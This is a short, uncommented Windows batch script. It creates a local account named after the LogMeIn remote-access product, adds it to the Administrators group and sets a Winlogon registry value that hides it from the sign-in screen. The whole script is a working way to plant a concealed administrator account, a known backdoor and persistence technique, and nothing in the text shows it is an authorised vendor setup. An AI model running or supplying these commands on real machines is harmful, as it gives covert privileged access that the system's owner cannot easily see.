net user LogMeInRemoteUser /ADD
net localgroup Administrators LogMeInRemoteUser /add
reg add "HKEY_Local_Machine\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v LogMeInRemoteUser /t REG_DWORD /d 0 /f
reg query "HKEY_Local_Machine\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v LogMeInRemoteUser
net user LogMeInRemoteUser
pause

